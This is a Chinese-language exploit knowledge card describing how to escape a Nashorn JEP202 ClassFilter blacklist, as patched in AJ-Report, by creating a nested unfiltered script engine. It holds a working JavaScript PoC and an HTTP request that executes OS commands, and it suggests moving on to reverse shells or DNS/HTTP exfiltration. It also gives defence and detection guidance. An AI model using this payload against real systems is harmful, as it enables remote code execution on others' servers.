---
id: web-java-rce-nashorn-jep202-classfilter-nested-engine-bypass
title: Nashorn JEP202 ClassFilter 绕过：受过滤脚本内新建 ScriptEngineManager 再 eval
type: scenario
domain: web
path: web/java/rce
technique: nashorn-jep202-classfilter-nested-engine-bypass
aliases:
- Nashorn ClassFilter 绕过
- JEP202 绕过
- AJ-Report 修复绕过
- 嵌套 ScriptEngineManager
- getEngineByExtension eval
- script engine sandbox escape
tags:
- java
- nashorn
- jep202
- classfilter
- sandbox-escape
- scriptengine
- jep290
- rce
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-V413
  verified_at: '2026-11-09T15:27:36+08:00'
  notes: '已对照原文与图片核对：补丁用 NashornScriptEngineFactory.getScriptEngine(clz -> !blackList.contains(clz)) 加 JEP202 ClassFilter 黑名单（ProcessBuilder/Runtime/ProcessImpl）、原 payload 报 ClassNotFoundException: java.lang.ProcessBuilder、嵌套 new javax.script.ScriptEngineManager().getEngineByExtension(''js'').eval(...) 后 ipconfig 回显成功，均与原文/截图一致；JEP202 只约束单个引擎实例、不禁止创建新引擎的原理成立。该卡为 --force 卡：与 web-java-rce-nashorn-java-type-blacklist-file-read（字符串黑名单/Java.type）及 web-java-expression-spel-waf-bypass-scriptengine-reflection（SpEL WAF 转 ScriptEngine）相比，防护层与绕过原语不同（引擎级 ClassFilter 套娃），区分理由成立。未验证点：未在本机复跑；affected_versions 已 --clear（JDK 8/11 为环境说明）。'
---

## 一句话结论

应用给 Nashorn 引擎设置 JEP202 `ClassFilter` 黑名单（如 `java.lang.ProcessBuilder`、`java.lang.Runtime`、`java.lang.ProcessImpl`）后，脚本里用 `new javax.script.ScriptEngineManager().getEngineByExtension("js").eval("new java.lang.ProcessBuilder('whoami')...")` 可以创建一个**新的、没有 ClassFilter 的 Nashorn 引擎**；内层 `eval` 直接执行被禁类，补丁被绕过。

## 原理

- **JEP202 的作用范围**：Nashorn 提供 `ClassFilter` 接口，应用可在创建引擎时传入 `getScriptEngine(ClassFilter)`；Nashorn 在脚本访问任何 Java 类之前都会查询该过滤器，即使没有 SecurityManager 也生效。设计目标是让脚本无法通过反射等方式突破类访问限制。
- **典型补丁写法**：应用把黑名单里的类名传给过滤器：
  ```java
  static final Set<String> blackList =
      Sets.newHashSet("java.lang.ProcessBuilder", "java.lang.Runtime", "java.lang.ProcessImpl");
  NashornScriptEngineFactory factory = new NashornScriptEngineFactory();
  engine = factory.getScriptEngine(clz -> !blackList.contains(clz));
  ```
  于是外层脚本直接 `new java.lang.ProcessBuilder(...)` 会失败（表现为 `ClassNotFoundException: java.lang.ProcessBuilder`，因为过滤器让类“看起来不存在”）。
- **过滤器是引擎实例级的**：ClassFilter 绑定在创建时传入的引擎/Context 上，只约束“该引擎解析的脚本”对 Java 类的访问。它并不会全局禁用 Nashorn，也不会阻止脚本创建新的 JSR-223 引擎。
- **套娃绕过**：`javax.script.ScriptEngineManager` 本身不在黑名单里，脚本可以：
  ```js
  var se = new javax.script.ScriptEngineManager();
  var r = se.getEngineByExtension("js").eval("new java.lang.ProcessBuilder('whoami').start().getInputStream();");
  ```
  `getEngineByExtension("js")` 内部新建 Nashorn 引擎时没有传入 ClassFilter（默认无过滤），内层 eval 的脚本可以任意访问 Java 类并执行命令。外层脚本只需要读取内层返回的 `InputStream`/字符串，即可把结果带回。
- **为什么这不是反射绕过**：JEP202 明确声称脚本不能通过反射绕过；但这里根本没有用反射——只是利用“同进程内可以创建另一个不带过滤器的解释器”这一配置边界。过滤器的检查对象错了：它只保护单个引擎实例，而不是整个进程的脚本能力。
- **同类模式**：Groovy 沙箱的 `GroovyShell`/`GroovyClassLoader`/`Eval`/`ScriptEngineManager` 重入也是同一个思路（新建解释器绕过 AST 检查），说明“黑名单式脚本沙箱 + 可新建解释器”是通用缺陷。

## 触发条件

- 应用存在用户可控脚本的 `ScriptEngine.eval()` 入口，且使用 Nashorn（JDK 8/11；JDK 15+ 需额外模块，JDK 17 默认移除）。
- 应用用 ClassFilter 黑名单做防护，且黑名单不包含 `javax.script.ScriptEngineManager`、`jdk.nashorn.api.scripting.NashornScriptEngineFactory` 等“创建新引擎”的类。
- 脚本语言允许 `new` Java 类、调用静态方法（Nashorn 默认允许）。
- 应用会调用脚本中定义的函数并把返回值回显（如 `verification`），或脚本能把结果写到可观测位置。

## 利用步骤

1. 确认脚本入口与黑名单：提交 `function verification(d){return 1;}`，再提交 `function verification(d){return new java.lang.ProcessBuilder('whoami').start().getInputStream();}`，若返回 `ClassNotFoundException`/类访问错误，说明 ClassFilter 生效。
2. 改用嵌套引擎：
   ```js
   function verification(data){
     var se = new javax.script.ScriptEngineManager();
     var r = se.getEngineByExtension("js").eval("new java.lang.ProcessBuilder('whoami').start().getInputStream();");
     var result = new java.io.BufferedReader(new java.io.InputStreamReader(r));
     var ss = '';
     var line;
     while ((line = result.readLine()) != null) { ss += line; }
     return ss;
   }
   ```
3. 把该函数放入目标接口的脚本参数（如 `validationRules`），触发 eval 并读取命令输出。
4. 将 `whoami` 替换为读文件/反弹 shell；若目标只回显布尔/字符串，可让内层脚本把结果写入文件或通过 DNS/HTTP 外带。

## PoC

```js
// 外层脚本（被 ClassFilter 保护）
function verification(data){
  var se = new javax.script.ScriptEngineManager();
  var r = se.getEngineByExtension("js").eval(
    "new java.lang.ProcessBuilder('whoami').start().getInputStream();"
  );
  var result = new java.io.BufferedReader(new java.io.InputStreamReader(r));
  var ss = '';
  var line;
  while ((line = result.readLine()) != null) { ss += line; }
  return ss;
}
```

```http
POST /dataSetParam/verification HTTP/1.1
Host: target
Content-Type: application/json

{"sampleItem":"1","validationRules":"function verification(data){var se=new javax.script.ScriptEngineManager();var r=se.getEngineByExtension('js').eval(\"new java.lang.ProcessBuilder('whoami').start().getInputStream();\");var result=new java.io.BufferedReader(new java.io.InputStreamReader(r));var ss='';var line;while((line=result.readLine())!=null){ss+=line;}return ss;}"}
```

说明：payload 按原文流程整理，命令输出为 Windows `ipconfig` 回显；未在本机复跑。

## 变体与关联

- **直接黑名单绕过**：若没有 ClassFilter、只做字符串黑名单，可用 `Java.type`/反射等，见 [[web-java-rce-nashorn-java-type-blacklist-file-read]]。
- **把脚本执行转移到其它引擎**：SpEL/表达式黑名单可用 `ScriptEngineManager` 转到 JS 引擎，见 [[web-java-expression-spel-waf-bypass-scriptengine-reflection]]。
- **Groovy 同型**：新建 `GroovyShell`/`GroovyClassLoader`/`Eval`/`ScriptEngine` 绕过 AST 沙箱，见 [[binary-pwn-sandbox-escape-groovy-interpreter-reinstantiation]]。
- **AJ-Report 场景**：本卡对应 AJ-Report 对 ScriptEngine eval 的 ClassFilter 补丁绕过，鉴权绕过见 [[web-java-component-aj-report-semicolon-swagger-path-param-auth-bypass]] 与 [[web-java-component-aj-report-default-jwt-sharetoken-forgery]]，原 RCE 入口见 [[web-java-component-aj-report-scriptengine-eval-rce]]。
- **边界**：ClassFilter 采用“只允许白名单类”而不是黑名单、显式禁止 `ScriptEngineManager`/`NashornScriptEngineFactory`、禁用 `new` Java 对象、或移除 Nashorn 时，本链不成立。

## 检测与防御

- **防护设计**：不要用黑名单式 ClassFilter 作为脚本沙箱；改用“仅允许白名单类”的过滤器，并显式拒绝 `javax.script.*`、`jdk.nashorn.*`、反射与类加载相关类；更彻底的做法是用独立进程/容器隔离脚本执行。
- **引擎**：升级到移除 Nashorn 的 JDK（15+ 需显式模块，17+ 默认无），或改用支持强沙箱的脚本引擎；禁用不必要的 `ScriptEngineManager` 服务发现。
- **入口**：不要把用户输入直接交给 `eval`；脚本模板只允许白名单表达式；对脚本接口增加鉴权与输入审计。
- **检测**：脚本 payload 中出现 `ScriptEngineManager`、`getEngineByExtension`、`getEngineByName`、`NashornScriptEngineFactory`、嵌套 `eval`；同一请求先触发类访问失败、随后出现嵌套引擎调用；子进程/网络外联异常。
